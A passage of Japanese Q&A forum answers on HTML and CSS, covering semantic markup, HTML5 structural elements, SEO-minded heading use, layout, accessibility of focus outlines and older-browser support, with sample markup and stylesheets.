ここでは、その名称と用途をclass名にしています。HTML5では 　<figure> 　　　<img width="300" height="188" alt="富士山の写真" src="http：[略]"> 　　　<figcaption> 　　　　<p>富士市より眺めた晴天時の富士山</p> 　　　</figcaption> 　</figure> となります。 これにたいして、 div.figure{ /* 挿絵のブロック*/ position:relative; } div.figure div.figcaption{ position:absolute; top:0;left:0; opacity:0.6; background-color:white; display:none; } div.figure:hover div.figcaption{display:block} とか、 時間が取れたら簡単なサンプルつくってみます。
＞SEO対策の為にH1タグにサイトの説明を入れてるのですが 　検索エンジンを騙すような事はしない。これがSEOの原則ですが・・・ 　<h1>見出しレベル1</h1>は、その文書の見出しとなるテキストを入れます。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 見出しの要素は、その章・節で述べられる話題を短く記すものである。見出し情報は、ユーザエージェントによって、例えば文書の目次を自動生成するために用いられたりもするであろう。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.5 )］より 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから These elements have a rank given by the number in their name. The h1 element is said to have the highest rank, the h6 element has the lowest rank, and two elements with the same name have equal rank. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.3 Sections — HTML5( http://www.w3.org/TR/html5/sections.html#the-h1,-h2,-h3,-h4,-h5,-and-h6-elements )］より 　<title></title>と同じものを入れておくのがSEO上では最適です。その文書の説明などでしたらDIV要素を「id属性及び class属性と併用することで、文書に構造を付加( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )」します。 　SEOに関心があるなら、説明と言うか、そのページの要約でしたら当然 <div class="header"> 　<h1>構造とプレゼンテーションの分離</h1> 　<div id="abstract"> 　　<h2>要約</h2> 　　<p> 　　　<abbr title="Hyper Text Markup Language">HTML</abbr>において<stong>文書構造とプレゼンテーションの分離</strong>は最も重要です。詳しくは<a href="http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1">構造とプレゼンテーションの分離</a>にあります。 　　</p> 　</div> </div> 　とマークアップされていると思います。これだと検索エンジンに「その文書のheaderに何が記述されているか」とか「要約がどこか」がすぐ理解できますよね。 　ただ、そうであっても、プレゼンテーション上控えめにしたい場合は、h1{font-size:14px;}とかはスタイルシートで指定すれば良いです。 　検索エンジンには、きちんと文書構造をマークアップしてヒントを与えて、ページの内容を正確に理解させること。これがSEO(検索エンジン最適化)の基本中の基本です。 　それをどのようにプレゼンテーションするかは、スタイルシートで行います。(無指定だとブラウザのデフォルトのスタイルシートが使われます。)
<head></head>内ならどこでもいいです。 SEOの事を考えると<title></title>は出来るだけ文書の上の方に置きたいので 私なら<head></head>内の<title></title>より下に書きますね。
id="hedder"のdivが画面の中央に来ないという意味であれば、CSSの #hedderdiv に position:relative; を指定しましょう。 position:absolute; を指定した場合、親要素が position:static; だと画面全体の左上から top left 等で位置指定をしなければいけませんが、親要素が position:static; 以外だと親要素の位置を基準に表示位置が決まります。
出力・非出力の制御じゃなくて、表示・非表示の設定ですよね？ であればstyle属性にdisplay:noneを付加するような出力にするか idに対してcssで非表示を渡すようなスタイルシートをjavaで出力してみては？
<div>は段落のまとまり、つまり、文章のまとまり、そこに文章がない！・・・おかしく思いませんか？ この要素以前の文面に、空間を作るための、装飾要素（padding margin)を設けることです。 ただし、装飾要素なので、HTMLに記述してはいけません！ 必ず、CSSに記述しましょう。 ＶａｌｉｄなＨＴＭＬを記述するには、validatorなどを利用されているとおもいますが、まずは仕様書を、熟読されることです。 　　　　↓↓↓↓↓↓↓↓↓↓↓↓ で、紹介・指摘されている意味も理解できると思います。
セル自体（tdやthタグ）にアンカーすることはできません。 しかしidを振っておけばそこに飛んでくれるブラウザが多いようです ＞セルの上の横線が一番上に ＞表示されるようにしたい 縦長のページにしてテーブルの下に十分な領域がないと テーブルを上に表示することはできません <a href="#hoge">hoge</a> <table border> <tbody> <tr><td>x</td></tr> <tr><td>x</td></tr> ・・・略・・・ <tr><td id="hoge">o</td></tr> <tr><td>x</td></tr> <tr><td>x</td></tr> ・・・略・・・ </tbody> </table> <a href="#hoge">hoge</a>
例のページは、単にぐるなびのページが煩雑なだけです。 一般的なユーザー観点から言うと、テキストコピーできなければならないにも関わらず、おそらく制作者の「意図しないところで」コピーしにくくなっています。ひとことでいうとページの構造が下手くそなんです。 また、大前提として、HTML/CSS/JavaScript、または画像などのメディアファイルをコピーできなくするのは、技術的に不可能です。右クリックの禁止やテキストの選択を無効になったようにみせかけることは可能ですが、それらの方法は簡単に破れるため、ブラウザが本来備えているコピーの機能を無効にすることは不可能です。
マイクロソフトのワードにもスタイル機能があることをご存知でしょうか? ワードでは、文字スタイルと段落スタイルと2種類のスタイルがあります。 その名の通り、文字に対してのスタイルと、段落に対してのスタイルです。 で、気になるのが、文字と段落の違いですね。 ワードでは行頭から改行までを「段落」と位置づけています。 つまり、文字に対しての装飾と、段落に対しての装飾ではいろいろ違ってくる部分があります。 HTML/CSSも同様の考え方です。 HTML/CSSでは、段落をブロックレベル要素、文字をインライン要素と言います。 ここまで分かれば、もう検索したほうが早いです。 「css インライン要素」でどうぞ。
質問内容からして、おそらく趣味の範囲でホームページをつくられているかと想像します。結論から言うと、趣味の範囲であれば、どのようにつくっても何の支障もありません。SEOの不利もありません。 ただ、Web制作を本業とするならば、作業の効率化を求めます。ディレクトリ構成を見た時に、直感的に理解できないファイル群は、制作的に恐ろしく非効率です。つまり、制作にコスト(手間)がかかるということです。一般的ではない構造ですね。
RewriteRule search/(.*) cgi/search/$1 [L] ##正常に動作 RewriteRule ^search/([0-9]+)$ cgi/search/navi.cgi?mode=kt&kt=$1 RewriteRule ^search/([0-9]+)/$ cgi/search/navi.cgi?mode=kt&kt=$1 については、2つ目、3つ目のルールは1つ目のルールに内包されてしまいますので、1つ目のルールにマッチして処理されてしまっていると思われます。 ルールの記述の順番を変えてあげればいけるのではないでしょうか。
IE6は切り捨ててよいでしょう。 IE7は可能な限り対処します。 IE8は対処します。 理由は 　⇒日本のブラウザバージョン別シェアグラフ2013 （StatCounter Global Statsより）( http://lhsp.s206.xrea.com/misc/browser-share-version.html ) 　⇒12月ブラウザシェア - IE11急成長、IE7も反転増加 | マイナビニュース( http://news.mynavi.jp/news/2014/01/06/284/ ) ＞驚いたのはIE8がChrome等と比べて表示がおかしくなる点です。 　きちんと製作すれば、そんな事はありません。 先日回答した　⇒CSSについてです - Webデザイン・CSS - 教えて！goo( http://oshiete.goo.ne.jp/qa/8472412.html )のソースをIE7以降で確認してご覧なさい。内容の追加(content:)は無視されますし、子供セレクタなどは使用できませんが、ウィンドウ幅、フォントサイズなどを変更してもレイアウトは崩れないはずです。IE6以前ではIE5も含めてh1をtext-align:centerに指定すると利用可能なはずです。 　もちろんスマホのように小さなウィンドも問題ないはずです。 　印刷にも対応しています。 　なぜなら、それを最大の目的で、HTML＋CSSでサイトを作るからです。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 　・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、・・・【中略】・・・ ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 )］より 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 文書の構造をプレゼンテーションと切り離すことで広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )］より [対策] ★HTML4.01strict!! + CSS2.1 　HTML4.01 --trnsitinalやframestじゃない 　「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/conform.html#h-4.1 )」 　CSS2.1(新しい機能は極力使用しない、使用してもそれが大きな影響を与えない使い方) 　DOCTYPEスイッチを適当に記述してブラウザが標準モードで動作するよう指定する。 　　⇒DOCTYPEスイッチ－HTMLの基本( http://www.htmq.com/htmlkihon/302.shtml ) ★リキッドデザイン、必要なら最新ブラウザ(特にスマホ)用にmediaqueryを併用する。 ＞これはIE8の特性と思って諦めるよりないのでしょうか。 　それは出来ません。今でも日本ではトップシェアですから・・ 　もう一度、「どんな環境からもWebの情報を利用できるようにすべ」という基本からスタートしてみましょう。 ※逆説的な言い方をすれば、利用環境を制約するようなデザインをするのでしたらHTMLを使うよりPDFなど他の仕様を利用すればよい。 　かといってHTML+CSSで自在なデザインが出来ないわけじゃない。先の回答例のように「左サイドにborderを縦一杯に引きたい」と一見難題を言われても対処できるでしょ。
簡単にやるなら <div style="text-align:center">ううう</div> ちょっと論理的にやるなら p.特に読者に訴えかけたい標語の段落 { text-align:center } <p class="特に読者に訴えかけたい標語の段落">ううう</p> 記事内の小見出しを全部寄せたいなら article > h6 { font:略; text-align:center } <article> <h6>ううう</h6> 複数行を中央寄せするなら ul.詩 li { list-style:none; text-align:center } <ul class=詩> <li>雨ニモマケズ <li>風ニモマケズ <li>雪ニモ夏ノ暑サニモマケヌ <li>丈夫ナカラダヲモチ ... </ul>
ユーザビリティのために、点線枠は表示されます。 どのブラウサでもそうなるはずです。 　これは、マウスではなく障害者がタブキーでフォーカスを移動した時にどこが現在地かを示す重要なインターフェースです。 ★ですから、消すのは望ましくありません。健常者だけがサイトを利用するわけじゃない!! 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 )］より 　それを消したければ onfocus=”this.blur()" 　また、 botton{outline:none;} 　しかし、それは残しておくことを強くお勧めします。
ですね。 回答No4様の言う通りです。 とは言え、それはそーなんですが、以前テレビでGoogleの技術者が言っておりましたが、 「みんながみんな、HTMLのマークアップやCSSの良き理解者であればいいのですが、それは極少数派で、PCに詳しくない方もWebサイトを作ったり公開したりすることは自由だし、またどんな作り方をしてもブラウザ側で処理して表示されるなら、それはそれで良いと思う。また、もしその自由な表現をだめにしたら、ここまでWebは発展しなかっただろう。。。」 的な事を言っていたことを思い出します。 しかし、自分のプライベートなサイトでしたら、どんなんであろうが良いとは思いますが、仕事でお客様のサイトを作ることであれば、話は別です。 CEO対策や、今後拡大されるであろうサイトの拡張化、複数な人によるサイト管理や制作などなど、HTMLとCSSを別にすること(当たり前)は重要なひとつです。膨大なサイトを作る上で、圧倒的に作業が容易です。
HTMLの基本は <body> 　<head> 　 ・・・このHTML文書のヘッダ・・(画面には表示されない) 　　スタイルシートやmeta情報などはここに書かれます。 　</head> 　<body> 　　・・・本文 　</body> </html> です。 　header要素は、HTML5で登場した本文中の導入部やナビゲーションをグループ化する要素です。 　HTML4.01～XHTML1.1でページを作成されていたと思いますが、それらには文書構造を示す要素がありませんでした。文書構造は 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )』と、明記してあった!! 　そのため、 <body> 　<div class="header"> 　　導入部やナビゲーション 　</div> 　<div class="section"> 　　本文 　</div> 　<div class="footer"> 　　文書情報など 　</div> </body> とマークアップされてきたと思います。 　ところが、仕様書をろくに読まない人が多く。 <body> 　<div id="top"> 　　導入部やナビゲーション 　</div> 　<div id="content"> 　　本文 　　<div id="leftMenue"> 　　</div> 　</div> 　<div id="bottom"> 　　文書情報など 　</div> </body> のように、文書構造ではなくプレゼンテーション的なidやクラス名を使用する人があとをたちません。 　それでは、何のためのHTMLかわからない。検索エンジンは無論、だれにも何処が導入で、本文で、本文と関係ないのかさっぱり分からない!! 　その反省から、 ★HTML5 では、文書をよりよく構造化するために、次の要素が新しく追加されました。( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements ) section、article、aside、hgroup、header、footer、nav、figure、figcaption 　★hgroupは採用されない見込み 　★アウトラインには影響しない、一箇所しかつかえないがmain要素が追加見込み ということです。 　ですから、従来　1999年のHTML4.01の勧告以来・・ <body> 　<div class="header"> 　　<h1>ページタイトル</h1> 　　<div class="nav"> 　　　<ol>ナビゲーションリスト</ol> 　　</div> 　</div> 　<div class="section">本文ブロック</div> 　<div class="footer">文書情報</div> </body> 　・・・・と書かれてきたと思いますが、それを <body> 　<header> 　　<h1>ページタイトル</h1> 　　<nav> 　　　<ol>ナビゲーションリスト</ol> 　　</nav> 　</header> 　<section>本文ブロック</section> 　<footer>文書情報</footer> </body> と書きなさいという事です。 <head>はHTML文書のヘッダで表示されない情報 <header>は、本文のうち「導入部やナビゲーション」をまとめる要素
罫線は長くなるのでしたらボックスのサイズ変更は成功しているのでしょう。 #sidebar-primary { width: 198px; border: solid 1px #00f; } #content { width: 698px; border: solid 1px #f00; } とすれば領域を確認できます。 もし、２つの領域を１つの背景画像で表示している場合は、この画像を変更する必要がありますね。
#1さんのおっしゃるようにスタイルシートを少し勉強してみれば、デザインの幅がぐっと広がります。ご提示の要素がよくわからないので、とりあえず<p>で説明しますが、スタイルシートはpがdivになっても、同じように扱えます。htmlが文章構造担当で、スタイルシートが見た目担当です。 line-heightは行間の意味です。その後ろの数字をtzennlfagx さんの好きな数値にしてみてください。 １．タグ的にインラインに入れ込むなら------------ <p style="line-height:1.8em">秋の田の かりほの庵の 苫をあらみ<br> わが衣手（ころもで）は 露にぬれつつ</p> <p style="line-height:1.1em;">「かりほ」は、「仮庵」と「刈り穂」の意味を持つ掛詞<br> 「仮庵の庵」で重ね詞 。<br> 農民の歌であるとか恋の歌であるなどの解釈がある。</p> ------------------------------------------ ２．<p style="line-height:1.1em;">head内に入れて何回も繰り返す事も可。別ファイルにして、サイト全体を制御するのが一般的。ここでは簡単にできる<head>内に入れる方法を。</head>のすぐ上にでも入れてみてください。 ------------------------------------------- <style type="text/css"> .tanka{line-height:1.8em;} .kaisetu{line-height:1.1em;} </style> </head> body内は----------------------------------- <p class="tanka">秋の田の かりほの庵の 苫をあらみ<br> わが衣手（ころもで）は 露にぬれつつ<br> </p> <p class="kaisetu">「かりほ」は、「仮庵」と「刈り穂」の意味を持つ掛詞<br> 「仮庵の庵」で重ね詞 </p> <p class="tanka">大江山いくのの道の遠ければ<br> まだふみも見ず天の橋立</p> <p class="kaisetu">まだふみも見ず天の橋立<br> ふみは「文」と「踏み」の掛詞</p> ------------------------------------------- ３．いろいろできる。 上の例ではclassごとの見た目を指定していますので、行間だけでなく、文字を大きくしたい、背景色を変えたいなどの要求が出てきたら、body内はそのままで、デザインの要素をどんどん増やせます。 head内ーーーーーーーーーーーーーーー 上記.tanka{line-height:1.8em;}を .tanka{line-height:1.8em;font-size:2em;background:#cccccc;}に変えてみてください。 ーーーーーーーーーーーーーーーーーー 今はわからなくても、スタイルシートに興味を持ってもらえれば、幸いです。
CSSは外部リンクですか？ HTMLファイルの文字コードが「UTF-8」なら CSSファイルの先頭に、「@charset "UTF-8";」 を記述してみてはいかがでしょうか？ もし、それが違ったら、 CSSの記述におかしなところはありませんか？
テーブルの幅がviewportで指定した幅より広いということでしょうか。 たとえばA4用紙をB5のレターケースに入れる事はできないように、 幅が広い要素を作ったのなら、viewportも相応に大きくしないと無理です。 viewportを515pxにしたいのなら、テーブルを515px以内に収まるように作らないと無理です。
＞同じサイトをスマホで見ると、字が小さくて読めません。 　作り方がまずい(^^) 　そもそもHTMLは、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 )］より 　その大原則を守っていれば、「同じサイトをスマホで見ると、字が小さくて読めません。」はないはずですね。 ＞教えてｇｏｏのように、 　「教えて!goo」はOKWave( http://www.okwave.co.jp/index.html )のシステムを利用している関係で、とても古い手法ですので参考にはならないでしょう。HTTP要求ヘッダのuser-agentで動的に出力されています。次々に登場する新しいuser agentに対応し切れていません。 [対策] ・リキッドデザインで製作する 　100%基準で--640px～1000px程度に伸縮、スマホだと縦置きの場合その幅に縮小されるが横置きだと640px、幅広ディスプレイだと1000pxまで伸びる。 ・それで足りない場合や、ユーザーインターフェースを変えるときはmediaQueryでスタイルシートを切り替える。 　が基本です。そうして置けば、スマホかパソコンじゃなく『様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器』さらに、プリンターや、検索エンジンにも対応するウェブページができる。 以前紹介した 　⇒ブログテンプレート作り　CSSで困ったことが・・・ - ホームページ作成ソフト - 教えて！goo( http://oshiete.goo.ne.jp/qa/8455241.html ) 　のHTMLを試してご覧なさい。 　 　
なんらかの別のスタイルシートが邪魔しているのでは？ その設定だけ書いたhtmlではどうですか？ <html> <head> <style> th.test1 { text-align: center; width: 100px;border:1px solid #000000;} </style> </head> <body> <p> <table> <tr> <th class="test1">日付</th> </tr> </table> </p> </body> </html>
申し訳ありませんが、ギリシャ文字を入力する具体的なソフトは存じません。 ただ、日本語を入力するための、かな漢字変換のソフトなども、日本語の入力に特化したものなので、同じようなものがあるとは思います。 ここでは、Windows 環境を想定して、とりあえず、入力と出力が可能な方法の一例を示します。 ・入力 　まず、ギリシャ文字をユニコードで編集可能なソフトが必要です。 　これに文字入力を行います。　 　もしも、ワード（あの、ワープロソフトです）で、最近のワードは対応しているようですから、 これが使えます。 　なければ、また、EmEditor ( http://jp.emeditor.com/ ) のうに、ユニコードに対応したエディタが使用可能と思います。 　文字入力の方法ですが、 http://homepage1.nifty.com/suzuri/000/pc6.html に情報がありました。 　このページにある方法が使えるのではないかと思います。 　 　特に、最後にある、IMEパッドから入力する という方法は、（マウスで一文字ずつ、文字をクリックする必要がありますが）文字を見ながら、入力可能です。 ・出力 　ここで編集したものを、数値文字参照形式に直す必要があります。 　探してみると、 HTMLCode http://www.vector.co.jp/soft/winnt/net/se483022.html 　が使えそうです。 　ワードに入力した後、HTML Code の上側のウインドウにこれをコピーした後、「10進変換」をクリックすると、数値文字参照形式に変換されたデータが得られます。 これで、編集はワード上で文字を見ながらできますから、少しは楽になるかと思います。
最近のブラウザなら table { display:inline-block } でOK
そりゃjQueryよりiFrameのほうが簡単に決まってるわｗｗｗ いちいち回答するほどの内容かよ。 （向き直って）質問者さんへ。 えー、 thickboxは作者が開発サポートを止めてしまっているので、もう使うべきではありません。 もう一方の人気プラグイン、fancyboxは商用利用が有償になったため、これも使いづらいし。。 残る定番となると、colorboxでしょうか。 これあたりを見てインストール http://tototo.grats.jp/jquery_colorbox/ $(要素).colorbox({オプション}); で、colorboxは開きますが、こういうurl固定の使用は「決め打ち」の場合の使い方で、今回の場合は、 var targetUrl; if( document.form1.q1[0].checked && document.form1.q2[0].checked && btn.name=='a') targetUrl = "./answer1.html"; // Called directly, without assignment to an element: // ＝要素にアサインせず、直に呼び出しするお $.colorbox({ href:targetUrl, 他オプション色々 }); これで一発かと。
HTMLにするより、XMLにするほうが楽ですよ。 RSS 1.0、RSS2.0、Atomの何れかのXMLにすればよいだけです。 RSS(XML)は人が読むための規格ではないのですが、XMLですので、スタイルシートXSLTなどでHTMLに変換すればよい。・・・RSSリーダーはどれにも対応している。 もともとの天気予報のフォーマットがわかりませんが、XHTMLでしたら苦もなくRSSフィードに変換できるはずです。
私はIEではありませんが、下記の方法ではないかと思います。 下記、図の赤枠の(1)のアイコンをクリック、、右隣の青枠がウェブサイトへの地図埋め込み用 HTML コードのようです。 ご参考まで。
たぶん変更できないと思います。 管理画面　→　ショップ設定　→　決済フォームの管理　→　決済フォームの選択 この中にある項目から選ぶようなので変更できないようです。 　→　決済フォームの追加 を利用すれば独自の項目を追加できるようですが、日本語の表示は残ってしまうようなのでご希望のような変更はできないと思います。
No.3です。 ＞と言うように書きたい場合は 　この点は、誤りです!!。 「という風に表示したい」と考えるべきです。 　表示目的で<p>や<br>を使いわけるのではありません。---とても多くの方が誤解されています--- ★HTMLは文書構造をマークアップする物★ 　いう原則から、あなたの示されたサンプルの場合は、<li>りんご</li>が最適なマークアップでしょう。ひょっとすると、<dl><dt>果物</dt><dd>りんご</dd>のほうが良いかもしれません。 　実際にサンプルを示して起きます。こうマークアップされていれば、機械にも（検索エンジンにも）文書の構造が理解できます。 ★タブは＿に置換してあるので戻す。 ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　でチェック済みのHTML4.01です。 　印刷時には、スタイルは適用されません。 ★スタイルがあるときと無いとき(ブラウザの表示メニュー→[スタイルシート]から選択)を確認してみましょう。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css" media="screen"> <!-- body{font-size:16px;} div.section div.section{ width:600px;border:solid 1px gray; margin:20px auto;padding:10px; border-radius:5px;box-shadow:5px 5px 5px; line-height:1.6em; } div.section div.section *{margin:0;padding:0;} div.section div.section h3, div.section div.section dt{ font-weight:bold;font-size:16px; font-family:sans-serif; } div.section div.section ul, div.section div.section dl{ } div.section div.section li, div.section div.section dd+dd, div.section div.section span{ margin-left:3em; } li,dd,#section4 p span.name{margin-left:2em;list-style:none;padding-left:0;} #section4 p{font-size:0;line-height:0;} #section4 p span,#section4 p strong{ display:block;color:black;font-size:16px; line-height:1.6em;font-weight:normal; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>1)野菜と果物</h2> ＿＿<p>木(木本)になる果実は果物、草(草本)になるものは野菜です。一例を挙げると</p> ＿＿<div class="section" id="section1"> ＿＿＿<h3>果物</h3> ＿＿＿<p>木(木本)になる果実は果物です。</p> ＿＿＿<ul><!-- 順不同リスト --> ＿＿＿＿<li>りんご</li> ＿＿＿＿<li>バナナ</li> ＿＿＿＿<li>カキ</li> ＿＿＿</ul> ＿＿＿<h3>野菜</h3> ＿＿＿<p>草(草本)になるものは野菜です。</p> ＿＿＿<ul> ＿＿＿＿<li>イチゴ</li> ＿＿＿＿<li>スイカ</li> ＿＿＿＿<li>トマト</li> ＿＿＿</ul> ＿＿</div> ＿＿<div class="section" id="section2"> ＿＿＿<dl><!-- 定義リスト --> ＿＿＿＿<dt>果物</dt> ＿＿＿＿<dd>木(木本)になる果実は果物です。</dd> ＿＿＿＿<dd>りんご</dd> ＿＿＿＿<dd>バナナ</dd> ＿＿＿＿<dd>カキ</dd> ＿＿＿＿<dt>野菜</dt> ＿＿＿＿<dd>草(草本)になるものは野菜です。</dd> ＿＿＿＿<dd>イチゴ</dd> ＿＿＿＿<dd>スイカ</dd> ＿＿＿＿<dd>トマト</dd> ＿＿＿</dl> ＿＿</div> ＿＿<div class="section" id="section3"> ＿＿＿<dl><!-- 定義リスト --> ＿＿＿＿<dt>果物</dt> ＿＿＿＿<dd>木(木本)になる果実は果物です。 ＿＿＿＿＿<ul> ＿＿＿＿＿＿<li>りんご</li> ＿＿＿＿＿＿<li>バナナ</li> ＿＿＿＿＿＿<li>カキ</li> ＿＿＿＿＿</ul> ＿＿＿＿</dd> ＿＿＿＿<dt>野菜</dt> ＿＿＿＿<dd>草(草本)になるものは野菜です。 ＿＿＿＿＿<ul> ＿＿＿＿＿＿<li>イチゴ</li> ＿＿＿＿＿＿<li>スイカ</li> ＿＿＿＿＿＿<li>トマト</li> ＿＿＿＿＿</ul> ＿＿＿＿</dd> ＿＿＿</dl> ＿＿</div> ＿＿<div class="section" id="section4"> ＿＿＿<h3>果物</h3> ＿＿＿<p> ＿＿＿＿<strong>木(木本)になる果実は果物です。</strong><span class="name">りんご</span>、<span class="name">バナナ</span>、<span class="name">カキ</span>は果物です。 ＿＿＿</p> ＿＿＿<h3>野菜</h3> ＿＿＿<p> ＿＿＿＿<strong>草(草本)になるものは野菜です。</strong><span class="name">イチゴ</span>、<span class="name">スイカ</span>、<span class="name">トマト</span>は野菜です。 ＿＿＿</p> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
「SublimeText」と検索して出てくる情報で十分かと思います。まずはじめにすることは、STにPackage Controlをインストールして、簡単にプラグインを管理できるようにします。 あとはjsやphpのテスト環境を作るのであればcui版のphpとnode.jsをPCにインストールして各プログラムを実行(ビルド)できるようにします。 その他、Sassのコンパイル・補完やテーマの変更などお気に入りのプラグインをインストールして終了です。 私の環境(win7 64bit)だとキーバインドが衝突してるか何かで一部動かない場合がありました。
> アイフォンの最新OSが必要ですかね？ 必要、というわけではないです。 ただあると便利ですね。 個人的な感覚で申し訳ないですが、お客さんにはiPhoneユーザーが多く、特にデザイナーはこだわりが強いので「何故思った通りに表示されない」という文句を言ってくる人は大体がiPhoneで見てます。 そういう人に対し、「iPhoneはFlash見れないんで変わりの画像を載せてます」とか、「あなたの作ったデザインは、これこれこういう理由でiPhoneでは実現できないんですよ。もうちょっと勉強してからデザインしてね」とか説明するにはiPhoneを持ってると便利です。 アンドロイドユーザーの方は「自分の持っているものがスタンダードではない」と言う事を理解しているのであまり無理は言ってこない印象です。 > 話し合った結果を文章にして了解のサインをもらうべきなのですね。 そうですね。 ちょっとした更新とかでなく、サイト全体の作成やSEOなど、かかる期間や金額が大きいものに関しては メールの履歴程度ではなく必ず書面にして契約書を交わします。 メール自体も本来は法的効力はあるのですが、ゴネる人はゴネます。 契約書があるとゴネたくてもおとなしくなる人は多いです。
marginの指定で回避出来ますが・・ そもそも、そんなHTML書かないし・・・ <div class="nav"> 　<ul> 　　<li>あああああああ</li> 　　<li>いいいいいいい</li> 　　<li>ううううううう</li> 　　<li>えええええええ</li> 　　<li>おおおおおおお</li> 　</ul> </div> で必要十分じゃないかと、あるいは <ul class="nav"> 　<li>あああああああ</li> 　<li>いいいいいいい</li> 　<li>ううううううう</li> 　<li>えええええええ</li> 　<li>おおおおおおお</li> </ul> でもよい。画像はコンテンツの一部ではないと判断して書いていません。 　IDはリンクやjavascriptのターゲットになりますから、良いとして、class名は文書構造を示す物にしましょう。 　「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )」 　class名には、HTML5で文書構造を示すために導入される新しい要素名( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements )程度に抑えておきましょう。すなわち、header,section,footer,nav,aside,article,figure,・・・ 　HTMLも簡潔になりますし、10年後にメンテナンス使用とした時にすぐ分かる。 スタイルシートは、 /* 本文(section)中のnav(igation)なら */ div.section ul.nav{ width:650px;min-height:600px; margin:0 auto; padding: 20px; overflow:hidden; background:url(image.jpg) no-repeat 20px 20px; list-style-type: square; } な簡単なものだけですむ。 全文・・・・ ★画像はとりあえず300px×500pxで用意した。 ★タブは＿に置換してあるので戻す。 ★<DOCTYPE>はこう書かないと、ブラウザ間の誤差で悩まされる。 　⇒DOCTYPEスイッチ－HTMLの基本( http://www.htmq.com/htmlkihon/302.shtml ) ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　でチェッずみのHTML4.01strict+CSS2.1(ウェブ標準)です。 　HTML5にするときは、そのまま<div class="header"></div>→<header></header>とすればよい。section.nav,footerも同様 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- /* 本文(section)中のnav(igation)は */ div.section ul.nav{ width:650px;min-height:540px; margin:0 auto; padding: 20px; overflow:hidden; background:url(image.jpg) no-repeat 20px 